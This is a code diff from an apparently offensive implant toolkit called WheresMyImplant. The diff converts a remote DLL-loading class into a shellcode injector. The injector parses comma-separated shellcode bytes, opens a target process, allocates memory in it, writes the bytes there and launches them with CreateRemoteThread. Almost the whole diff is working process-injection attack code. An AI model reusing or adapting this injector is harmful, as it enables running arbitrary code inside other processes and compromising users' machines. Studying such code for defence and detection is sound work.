@@ -6,20 +6,19 @@ using Unmanaged.Libraries;
 
 namespace WheresMyImplant
 {
-    internal sealed class LoadDllRemote : Base, IDisposable
+    internal class InjectShellCodeRemote : Base, IDisposable
     {
         private IntPtr hProcess;
         private IntPtr hThread;
-        private IntPtr libraryPtr;
-        private String library;
+        private String shellCodeString;
         private UInt32 processId;
 
         ////////////////////////////////////////////////////////////////////////////////
         //
         ////////////////////////////////////////////////////////////////////////////////
-        internal LoadDllRemote(String library, UInt32 processId)
+        internal InjectShellCodeRemote(String shellCodeString, UInt32 processId)
         {
-            this.library = library;
+            this.shellCodeString = shellCodeString;
             this.processId = processId;
         }
 
@@ -28,50 +27,45 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         internal void Execute()
         {
+            const Char DELIMITER = ',';
+            String[] shellCodeArray = shellCodeString.Split(DELIMITER);
+            Byte[] shellCodeBytes = new Byte[shellCodeArray.Length];
+
+            for (Int32 i = 0; i < shellCodeArray.Length; i++)
+            {
+                Int32 value = (Int32)new System.ComponentModel.Int32Converter().ConvertFromString(shellCodeArray[i]);
+                shellCodeBytes[i] = Convert.ToByte(value);
+            }
+
             ////////////////////////////////////////////////////////////////////////////////
             WriteOutputNeutral(String.Format("Attempting to get handle on {0}", processId));
-            hProcess = kernel32.OpenProcess(/*kernel32.PROCESS_CREATE_THREAD | kernel32.PROCESS_QUERY_INFORMATION | kernel32.PROCESS_VM_OPERATION | kernel32.PROCESS_VM_WRITE | kernel32.PROCESS_VM_READ*/ kernel32.PROCESS_ALL_ACCESS, false, processId);
+            hProcess = kernel32.OpenProcess(kernel32.PROCESS_CREATE_THREAD | kernel32.PROCESS_QUERY_INFORMATION | kernel32.PROCESS_VM_OPERATION | kernel32.PROCESS_VM_WRITE | kernel32.PROCESS_VM_READ, false, processId);
             if (IntPtr.Zero == hProcess)
             {
                 WriteOutputBad("Unable to open process");
                 return;
             }
-            WriteOutputGood(String.Format("Handle: 0x{0}", hProcess.ToString("X4")));
-
-            ////////////////////////////////////////////////////////////////////////////////
-            IntPtr hModule = kernel32.GetModuleHandle("kernel32.dll");
-            WriteOutput(hModule.ToString());
-            if (IntPtr.Zero == hModule)
-            {
-                WriteOutputBad("Unable to open module handle to kernel32.dll");
-                return;
-            }
-
-            IntPtr loadLibraryAddr = kernel32.GetProcAddress(hModule, "LoadLibraryA");
-            if (IntPtr.Zero == loadLibraryAddr)
-            {
-                WriteOutputBad("Unable to open module handle to LoadLibraryA");
-                return;
-            }
+            WriteOutputGood(String.Format("Handle: {0}", hProcess.ToString("X4")));
 
             ////////////////////////////////////////////////////////////////////////////////
             IntPtr lpAddress = IntPtr.Zero;
-            UInt32 dwSize = (UInt32)((library.Length + 1) * Marshal.SizeOf(typeof(char)));
+            UInt32 dwSize = (UInt32)shellCodeBytes.Length;
             WriteOutputNeutral("Attempting to allocate memory");
-            IntPtr lpBaseAddress = kernel32.VirtualAllocEx(hProcess, lpAddress, dwSize, kernel32.MEM_COMMIT | kernel32.MEM_RESERVE, Winnt.PAGE_READWRITE);
+            IntPtr lpBaseAddress = kernel32.VirtualAllocEx(hProcess, lpAddress, dwSize, kernel32.MEM_COMMIT, Winnt.PAGE_READWRITE);
             if (IntPtr.Zero == lpBaseAddress)
             {
                 WriteOutputBad("Unable to allocate memory");
                 return;
             }
             WriteOutputGood(String.Format("Allocated {0} bytes at 0x{1}", dwSize, lpBaseAddress.ToString("X4")));
-            WriteOutputGood("Memory Protection Set to PAGE_READWRITE");
+            WriteOutputGood("Memory Protection Set to PAGE_READWRITE");  
 
             ////////////////////////////////////////////////////////////////////////////////
             UInt32 lpNumberOfBytesWritten = 0;
-            libraryPtr = Marshal.StringToHGlobalAnsi(library);
+            GCHandle pinnedArray = GCHandle.Alloc(shellCodeBytes, GCHandleType.Pinned);
+            IntPtr shellCodeBytesPtr = pinnedArray.AddrOfPinnedObject();
             WriteOutputNeutral("Attempting to write process memory");
-            if (!kernel32.WriteProcessMemory(hProcess, lpBaseAddress, libraryPtr, dwSize, ref lpNumberOfBytesWritten))
+            if (!kernel32.WriteProcessMemory(hProcess, lpBaseAddress, shellCodeBytesPtr, (UInt32)shellCodeBytes.Length, ref lpNumberOfBytesWritten))
             {
                 WriteOutputBad("WriteProcessMemory Failed");
                 return;
@@ -95,23 +89,23 @@ namespace WheresMyImplant
             UInt32 dwCreationFlags = 0;
             UInt32 threadId = 0;
             WriteOutputNeutral("Attempting to start remote thread");
-            hThread = kernel32.CreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, loadLibraryAddr, lpBaseAddress, dwCreationFlags, ref threadId);
+            hThread = kernel32.CreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, lpBaseAddress, lpParameter, dwCreationFlags, ref threadId);
             if (IntPtr.Zero == hThread)
             {
                 WriteOutputBad("CreateRemoteThread Failed");
                 return;
             }
 
-            WriteOutputGood(String.Format("Started Thread: 0x{0}", hThread.ToString("X4")));
-
-            ///////////////////////////////////////////////////////////////////////////////
+            WriteOutputGood(String.Format("Started Thread: {0}", hThread));
+            
+            ////////////////////////////////////////////////////////////////////////////////
             kernel32.WaitForSingleObjectEx(hProcess, hThread, 0xFFFFFFFF);
         }
 
         ///////////////////////////////////////////////////////////////////////////////
         //
         ///////////////////////////////////////////////////////////////////////////////
-        ~LoadDllRemote()
+        ~InjectShellCodeRemote()
         {
             Dispose();
         }
@@ -129,11 +123,6 @@ namespace WheresMyImplant
             if (IntPtr.Zero != hThread)
             {
                 kernel32.CloseHandle(hThread);
-            }
-
-            if (IntPtr.Zero != libraryPtr)
-            {
-                Marshal.FreeHGlobal(libraryPtr);
             }
         }
     }
